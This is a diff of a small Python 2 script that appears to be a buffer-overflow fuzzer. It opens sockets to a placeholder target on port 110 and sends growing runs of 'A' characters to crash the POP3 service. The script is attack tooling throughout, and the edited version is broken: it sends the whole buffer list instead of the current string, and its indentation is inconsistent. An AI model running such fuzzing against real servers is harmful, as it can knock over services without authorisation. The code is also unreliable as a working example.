@@ -1,10 +1,15 @@
 #!/usr/bin/python
 import socket
+buffer=["A"]
+counter=100
+while len(buffer) <= 30:
+	buffer.append("A"*counter)
+	counter=counter+200
 
-for i in range(30):
- s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
- s.connect(('<TARGET_IP_ADDRESS>',<TARGET_PORT>))
- payload = int(i)*("A"*100)
- s.send(payload+"\r\n")
- print "[Info] Fuzzing with " + str(len(str(payload))) + " A's\r\n"
+for string in buffer:
+	print "Fuzzing with %s bytes" % len(string)
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	connect=s.connect(('<TARGET_IP_ADDRESS>',110))
+	s.recv(1024)
+	s.send(buffer+'\r\n')
  s.close()
